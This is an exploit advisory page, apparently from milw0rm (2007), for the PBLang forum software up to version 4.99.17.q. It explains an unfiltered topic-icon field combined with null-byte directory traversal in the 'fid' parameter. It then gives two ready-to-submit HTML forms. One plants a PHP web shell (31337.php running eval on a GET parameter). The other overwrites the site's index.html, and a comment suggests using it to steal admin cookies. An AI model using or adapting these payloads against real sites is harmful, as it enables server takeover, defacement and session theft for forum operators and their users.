<html><head><title>PBLang <= 4.99.17.q Remote File Rewriting / Command Execution</title></head><pre>---------------------------------------------------------------
 ____            __________         __             ____  __   
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
 |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
 |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|  
          \/\______|      \/     \/                         
---------------------------------------------------------------

Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 

---------------------------------------------------------------

PBLang &lt;= 4.99.17.q Remote File Rewriting / Remote Command Execution

---------------------------------------------------------------

#By KiNgOfThEwOrLd				

---------------------------------------------------------------
PoC:

PBLang is a flat forum, it doesn't need any database. When we write a new 
topic, all the topics informations will be saved in a file located in 
&quot;\db\posts&quot; (a not readeable directory). It looks like a php file, in fact the 
informations will be saved in this way:

&lt;?php

$psubject=&quot;[subject]&quot;;
$pcontent=&quot;[contenet]&quot;;
$pauthor=&quot;[author]&quot;;
$pdate=&quot;[date]&quot;;
$plastdate=&quot;&quot;;
$pimage=&quot;[icon]&quot;;
$plastreply=&quot;0&quot;;
$plastauthor=&quot;&quot;;
$preplies=&quot;0&quot;;
$pviews=&quot;0&quot;;
$pnotify=&quot;&quot;;
$plock=&quot;&quot;;
$pip=&quot;&quot;;
$pvisitors=&quot;&quot;;
$psticky=&quot;&quot;;
$plockview=&quot;&quot;;

?&gt;

The &quot;subject&quot; and the &quot;contenent&quot; values is &quot;htmlentitiesed&quot;, so we can't type 
a malicious code there...but the &quot;image&quot; value is not filtred, so we can 
execute a malicious code!
Don't worry if the directory is not readable, using the directory traversl 
variable we can make a file where we want, and so we can read that! The file 
name will be the &quot;fid&quot; value that we send via POST, and the file wont have any 
estension, it will be like: fid_1 (or something like that). Then, editing the 
cid value like: &quot;evilfile.php\0&quot;, we can make a malicious file.

Ps. u gotta use nullbyte not encoded, like: \0
if u try to use %00 it will be not considered like nullbyte  ;) 

---------------------------------------------------------------
Remote Command Execution Exploit (Works only whit Magic Quotes OFF):

&lt;!-- This code will make &quot;31337.php&quot; in http://[target]/[pblang_path], u can 
execute a malicious code via GET as 31337.php?php=[YOUR_CODE] --&gt;
&lt;form action='[target]/ntopic.php?idnum=[idtopic]' name='postmodify' 
enctype='multipart/form-data' method='POST'  onSubmit='submitonce
(this);'target='_self'&gt;
&lt;input type='text' name='subject' value='Owned by KiNgOfThEwOrLd's Exploit'&gt;
&lt;input type='hidden' name='fid' value='../../../../31337.php\0'&gt;
&lt;input type='hidden' name='cat' value='2' size=40&gt;
&lt;input type='radio' name='topicicon' value='&quot;; &lt;?php eval(stripslashes($_GET
[php])); ?&gt;' CHECKED&gt;
&lt;textarea name='message' rows='12' cols='60' onselect='storeCaret(this)' 
onclick='storeCaret(this)' onkeyup='storeCaret(this)'&gt;VISIT Http://www.inj3ct-
it.org&lt;/textarea&gt;
&lt;input type='hidden' name='gueststatus' value=''&gt;
&lt;input type='checkbox' name='EMNotify'&gt;
&lt;input type='submit' name='Submit' value='Own!'&gt;
&lt;/form&gt;
---------------------------------------------------------------
Index Rewriting Exploit

&lt;!-- This code will rewrite or make &quot;index.html&quot; in http://[target]/
[pblang_path] --&gt;
&lt;form action='[target]/ntopic.php?idnum=[idtopic]' name='postmodify' 
enctype='multipart/form-data' method='POST'  onSubmit='submitonce
(this);'target='_self'&gt;
&lt;input type='text' name='subject' value='Owned by KiNgOfThEwOrLd's Exploit'&gt;
&lt;input type='hidden' name='fid' value='../../../../index.html\0'&gt;
&lt;input type='hidden' name='cat' value='2' size=40&gt;
&lt;input type='radio' name='topicicon' value='&quot;; [YOUR HTML CODE]' CHECKED&gt;
&lt;textarea name='message' rows='12' cols='60' onselect='storeCaret(this)' 
onclick='storeCaret(this)' onkeyup='storeCaret(this)'&gt;VISIT Http://www.inj3ct-
it.org&lt;/textarea&gt;
&lt;input type='hidden' name='gueststatus' value=''&gt;
&lt;input type='checkbox' name='EMNotify'&gt;
&lt;input type='submit' name='Submit' value='Own!'&gt;
&lt;/form&gt;
&lt;!-- You can also use this one to steal the admin's cookies, or execute some 
arbitrary operations  ;)  --&gt;
---------------------------------------------------------------

# milw0rm.com [2007-11-24]</pre></html>